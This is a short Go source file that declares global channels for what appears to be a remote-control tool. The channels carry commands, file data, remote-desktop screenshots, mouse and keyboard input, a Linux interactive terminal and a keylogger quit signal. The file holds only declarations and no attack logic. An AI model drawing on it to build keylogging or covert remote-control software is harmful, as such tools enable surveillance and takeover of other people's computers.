package setchannel

import "sync"

var mutex sync.Mutex

var CmdMsgChan = make(chan string)                            // 命令消息通道
var FileSliceDataChan = make(map[string]chan interface{})     // 文件元数据通道
var NextScreenChan = make(map[string]chan string)             // 远程桌面请求下一张截图通道
var MouseActionChan = make(map[string]chan string)            // 鼠标动作通道
var KeyboardActionChan = make(map[string]chan string)         // 键盘动作通道
var PtyDataChan = make(map[string]chan interface{})           // linux交互终端数据通道
var KeyloggerQuitSignChan = make(map[string]chan interface{}) // 退出键盘记录器信号通道
var MsUploadChan = make(map[string]chan interface{})
